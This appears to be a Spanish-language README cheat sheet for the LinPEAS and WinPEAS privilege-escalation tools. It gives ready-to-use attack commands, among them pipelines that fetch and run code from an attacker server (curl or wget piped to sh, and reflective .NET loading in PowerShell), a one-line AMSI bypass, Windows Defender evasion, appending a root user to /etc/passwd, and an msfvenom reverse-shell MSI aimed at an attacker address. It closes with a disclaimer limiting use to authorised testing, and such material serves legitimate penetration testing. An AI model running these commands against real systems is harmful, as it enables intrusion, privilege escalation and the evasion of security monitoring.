<!-- language-home-navigation -->
[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🦹 PEASS-ng (LinPEAS y WinPEAS) - Hoja de referencia completa

[🇹🇷 Türkçe Sürüm](traducciones/README.tr.md)
```
  ██████╗ ███████╗ █████╗ ███████╗███████╗      ███╗   ██╗ ██████╗ 
  ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝      ████╗  ██║██╔════╝ 
  ██████╔╝█████╗  ███████║███████╗███████╗█████╗██╔██╗ ██║██║  ███╗
  ██╔═══╝ ██╔══╝  ██╔══██║╚════██║╚════██║╚════╝██║╚██╗██║██║   ██║
  ██║     ███████╗██║  ██║███████║███████║      ██║ ╚████║╚██████╔╝
  ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝      ╚═╝  ╚═══╝ ╚═════╝ 
             LinPEAS & WinPEAS Privilege Escalation Suite
```
<p align="centro">
  <img src="https://img.shields.io/badge/PEASS--ng-PrivEsc-red?style=for-the-badge" alt="PEASS-ng">
  <img src="https://img.shields.io/badge/LinPEAS-Linux_PrivEsc-blue?style=for-the-badge" alt="LinPEAS">
  <img src="https://img.shields.io/badge/WinPEAS-Windows_PrivEsc-orange?style=for-the-badge" alt="WinPEAS">
  <img src="https://img.shields.io/badge/Automated-Enumeration-green?style=for-the-badge" alt="Automatizado">
</p>

<p align="centro">
  <b>🔍 Las herramientas automatizadas de escalada de privilegios más populares del mundo para sistemas Linux y Windows</b>
</p>

---

## 📋 Tabla de contenidos

- [Introducción](#-introducción)
- [Leyenda de color y cómo leer la salida] (#-color-legend--cómo-leer-la salida)
- [LinPEAS (Escalada de privilegios de Linux)](#-linpeas-linux-escalada-de-privilegios)
  - [Descarga y ejecución en memoria] (#descarga--ejecución-en-memoria)
  - [Opciones de línea de comando](#opciones de línea de comando)
  - [Vectores centrales verificados por LinPEAS] (#vectores centrales verificados por linpeas)
  - [Sigilo y evasión AV](#stealth--av-evasion)
- [WinPEAS (Escalada-de-privilegios de Windows)](#-winpeas-windows-privilege-escalation)
  - [Métodos de ejecución (.exe vs .bat)](#métodos-de-ejecución-exe-vs-bat)
  - [Ejecutando WinPEAS en memoria](#running-winpeas-in-memory)
  - [Vectores centrales comprobados por WinPEAS](#vectores centrales-comprobados-por-winpeas)
  - [Omitir Windows Defender y AMSI](#bypassing-windows-defender--amsi)
- [Interpretación de hallazgos de alta prioridad](#-interpretación-de-hallazgos-de-alta-prioridad)
- [Tabla de referencia rápida](#-tabla-de-referencia-rápida)
- [Consejos y mejores prácticas](#-consejos--mejores-prácticas)
- [Aviso legal](#-aviso-legal)
- [Recursos](#-recursos)

---

## 🎯 Introducción

**PEASS-ng** (Privilege Escalation Awesome Scripts SUITE - nueva generación), creado por Carlos Polop, es la colección estándar de facto de herramientas de auditoría automatizadas utilizadas para descubrir vectores de escalada de privilegios en sistemas comprometidos:

- **LinPEAS:** Un script Bash todo en uno que busca configuraciones erróneas, credenciales, archivos grabables, binarios SUID, vulnerabilidades del kernel, trabajos cron y contenedores en sistemas Linux/Unix.
- **WinPEAS:** Disponible como un binario .NET compilado independiente (`winPEASany.exe`, `winPEASx64.exe`) y un script por lotes liviano (`winPEAS.bat`) para auditar estaciones de trabajo, miembros de dominio y servidores de Windows.

---

## 🎨 Leyenda de color y cómo leer la salida

El poder definitorio de PEASS es su sistema automatizado de clasificación de colores:

| Color | Importancia | Significado |
|-------|--------------|---------|
| 🔴 **ROJO/AMARILLO** | 🚨 **CRÍTICO (99% PrivEsc)** | Vector de escalada de privilegios altamente confiable. ¡Debe comprobarlo inmediatamente! |
| 🔴 **ROJO** | ⚠️ **Interesante** | Configuración inusual, configuración no predeterminada o candidato a credencial. |
| 🟡 **AMARILLO** | ℹ️ **Informativo** | Hallazgo notable que podría ser parte de una cadena de explotación. |
| 🔵 **CIAN / AZUL** | 👥 **Contexto** | Usuarios, grupos e información estándar del sistema. |

> **Regla de oro:** ¡Desplácese directamente hasta los aspectos más destacados **ROJO/AMARILLO** primero! Si ve texto con un fondo amarillo y letras rojas, es casi seguro que se trata de un vector de explotación.

---

## 🐧 LinPEAS (Escalada de privilegios de Linux)

### Descarga y ejecución en memoria

Rara vez es necesario escribir `linpeas.sh` en el disco. Ejecútelo directamente en la memoria utilizando las utilidades estándar de UNIX:
```bash
# 1. From attacker Python web server directly into bash
curl -L http://10.10.14.5:8000/linpeas.sh | sh

# Alternative using wget
wget -q -O - http://10.10.14.5:8000/linpeas.sh | sh

# 2. Download from official GitHub directly (if target has outbound internet access)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 3. Save output to file and review with colors preserved
./linpeas.sh -a > /tmp/linpeas.txt
less -r /tmp/linpeas.txt
```
### Opciones de línea de comandos
```bash
# Run all checks (including slower exhaustive searches)
./linpeas.sh -a

# Fast mode (skips slow regex / deep file checks)
./linpeas.sh -q

# Password provided for automated 'sudo -l' testing
./linpeas.sh -p 'KnownPassword123'

# Network-only checks (active connections, ARP cache, listening ports)
./linpeas.sh -N

# System information only
./linpeas.sh -s
```
### Vectores principales controlados por LinPEAS

1. **Configuraciones erróneas de Sudo (`sudo -l`):**
   - Comandos ejecutables como root sin contraseña (`NOPASSWD`).
   - Reutilización de tokens Sudo / CVE-2021-3156 (Baron Samedit).
2. **Binarios SUID / SGID:**
   - Binarios con permisos root (`chmod +s`). Referencia cruzada con **GTFOBins**.
3. **Capacidades de Linux:**
   - Binarios con capacidades elevadas como `cap_setuid+ep` (por ejemplo, `python3`, `tar`, `perl`).
4. **Tareas programadas y temporizadores:**
   - Crontabs (`/etc/crontab`, `/var/spool/cron/*`) y scripts programados grabables.
   - Temporizadores del sistema (`systemctl list-timers`).
5. **Secuestro de rutas y entornos:**
   - Directorios grabables en `$PATH`, búsquedas de comandos relativas en scripts.
6. **Explotación del kernel:**
   - La versión del kernel se comparó con exploits conocidos (Dirty COW, Dirty Pipe, OverlayFS).
7. **Aplastamiento de raíces NFS:**
   - Directorios compartidos montados con `no_root_squash` en `/etc/exports`.
8. **Recolección de credenciales:**
   - Contraseñas de texto sin cifrar en `.bash_history`, archivos de configuración (`wp-config.php`, `.env`), claves SSH (`id_rsa`) y volcados de memoria.

---

## 🪟 WinPEAS (Escalada de privilegios de Windows)

### Métodos de ejecución (.exe frente a .bat)

WinPEAS se proporciona en múltiples formatos:
- **`winPEASx64.exe` / `winPEASany.exe`:** Escrito en C#/.NET. Más completo; realiza comprobaciones profundas de registro, API y credenciales.
- **`winPEAS.bat`:** Script por lotes simple. Altamente compatible con versiones heredadas de Windows, no requiere dependencias de .NET y evade ciertas detecciones binarias estáticas.
```cmd
:: Run winPEAS binary with full color output
winPEASx64.exe

:: Run stealthily and redirect to text file
winPEASx64.exe > C:\Windows\Temp\out.txt

:: Fast check without heavy registry and file searches
winPEASx64.exe quiet
```
### Ejecutando WinPEAS en la memoria

Para evitar guardar archivos en el disco en estaciones de trabajo auditadas, cargue WinPEAS directamente en la memoria de PowerShell:
```powershell
# In-memory execution using Net.WebClient
$pe = (New-Object System.Net.WebClient).DownloadData('http://10.10.14.5:8000/winPEASx64.exe')
[System.Reflection.Assembly]::Load($pe)
[winPEAS.Program]::Main("")
```
### Vectores principales controlados por WinPEAS

1. **Permisos de servicio y rutas sin comillas:**
   - **Rutas de servicio sin comillas:** Rutas binarias de servicio con espacios y sin comillas (`C:\Program Files\App\service.exe` -> el atacante coloca `C:\Program.exe`).
   - **Permisos de servicio débiles:** Usuarios no administradores que tengan `SERVICE_ALL_ACCESS` o `SERVICE_CHANGE_CONFIG`.
2. **Secuestro de DLL:**
   - Servicios que intentan cargar archivos DLL inexistentes desde directorios editables por el usuario.
3. **Instalar siempre elevado:**
   - Claves de registro `AlwaysInstallElevated = 1` que permiten a cualquier usuario instalar paquetes MSI elevados con `msiexec`.
4. **Privilegios de token (SeImpersonate / SeAssignPrimaryToken):**
   - Explotable a través de exploits Potato (SweetPotato, GodPotato, PrintSpoofer) para elevar desde cuentas de servicio (`IIS APPPOOL`, `LOCAL SERVICE`) a `NT AUTHORITY\SYSTEM`.
5. **Tiendas de credenciales y inicio de sesión automático:**
   - Contraseñas de texto sin cifrar en el Registro (`DefaultPassword` en Winlogon).
   - Conexiones RDP guardadas, credenciales de Vault, blobs DPAPI, sesiones PuTTY, contraseñas WiFi.
6. **Archivos de respaldo de SAM y SISTEMA:**
   - Copias grabables o legibles de `C:\Windows\Repair\SAM` o `C:\Windows\System32\config\RegBack\SAM`.

### Omitir Windows Defender y AMSI

Windows Defender marca activamente las versiones compiladas de `winPEASx64.exe`. Para ejecutar WinPEAS en entornos monitoreados:
```powershell
# 1. Obfuscate winPEAS binary using Invisibility / Donut or custom compiler
# 2. Patch AMSI in PowerShell session before running in memory:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 3. Alternatively, fall back to winPEAS.bat (often unflagged by AV):
curl.exe http://10.10.14.5:8000/winPEAS.bat -o %TEMP%\wp.bat && %TEMP%\wp.bat
```
---

## 🎯 Interpretación de hallazgos de alta prioridad

### 1. LinPEAS: `/etc/passwd` escribible
Si LinPEAS marca `/etc/passwd` en **ROJO/AMARILLO**:
```bash
# Generate password hash:
openssl passwd -1 -salt evil SaltPass123
# Append root user:
echo 'root2:$1$evil$TNy7V...:0:0:root:/root:/bin/bash' >> /etc/passwd
su root2
```
### 2. WinPEAS: `SeImpersonatePrivilege` presente
Si mantienes `SeImpersonatePrivilege`:
```powershell
# Elevate instantly using GodPotato or PrintSpoofer:
.\GodPotato-NET4.exe -cmd "cmd.exe /c whoami"
```
### 3. WinPEAS: `AlwaysInstallElevated` establecido en 1
```powershell
# Generate malicious MSI payload:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o priv.msi
# Run installer as low-privileged user:
msiexec /quiet /qn /i priv.msi
```
---

## 📊 Tabla de referencia rápida

| Objetivo | Comando | Propósito |
|--------|---------|---------|
| **Linux (Remoto)** | `curl -L http://<IP>/linpeas.sh \| sh` | Ejecución en memoria sin tocar el disco |
| **Linux (local)** | `./linpeas.sh -a > out.txt` | Auditoría completa guardada en un archivo de texto |
| **Linux (Rápido)** | `./linpeas.sh -q` | Escaneo rápido omitiendo búsquedas lentas de archivos |
| **Windows (CLI)** | `winPEASx64.exe quiet` | Ejecución rápida con ruido reducido |
| **Windows (Memoria)**| `[System.Reflection.Assembly]::Load($pe)` | Cargue el binario .NET en la memoria mediante PowerShell |
| **Windows (por lotes)** | `winPEAS.bat` | Ejecución libre de dependencias para evasión AV/heredada |

---

## 💡 Consejos y mejores prácticas

1. **Revisar la salida usando `less -r`:**
   Al redirigir la salida a un archivo (`./linpeas.sh > linpeas.txt`), véalo siempre usando `less -r linpeas.txt` o `cat linpeas.txt` para que los códigos de escape de color ANSI del terminal se representen correctamente.
2. **Transferencia vía Puerto 80/443:**
   Cuando instale LinPEAS o WinPEAS en su caja de atacante, aloje su servidor web en el puerto `80` o `443` usando `python3 -m http.server 80` para evitar las estrictas reglas de salida del firewall de destino.
3. **No pase por alto las credenciales ocultas:**
   Consulte las secciones "Archivos interesantes" y "Credenciales de nube" de la salida de LinPEAS; A menudo, los tokens API de texto sin formato o las credenciales de AWS otorgan mayores privilegios que un exploit local.

---

## ⚠️ Aviso legal

> **IMPORTANTE:** Los scripts PEASS-ng realizan una auditoría interna integral y un descubrimiento de configuración. Solo deben ejecutarse en sistemas en los que tenga permiso documentado durante pruebas de penetración autorizadas, ejercicios CTF o auditorías de seguridad internas.

---

## 📚 Recursos

- [Repositorio oficial de GitHub de PEASS-ng](https://github.com/carlospolop/PEASS-ng)
- [Biblia de escalada de privilegios y nube de HackTricks] (https://book.hacktricks.xyz/)
- [GTFOBins - Explotación de binarios de Unix](https://gtfobins.github.io/)
- [LOLBAS - Windows que vive de la tierra](https://lolbas-project.github.io/)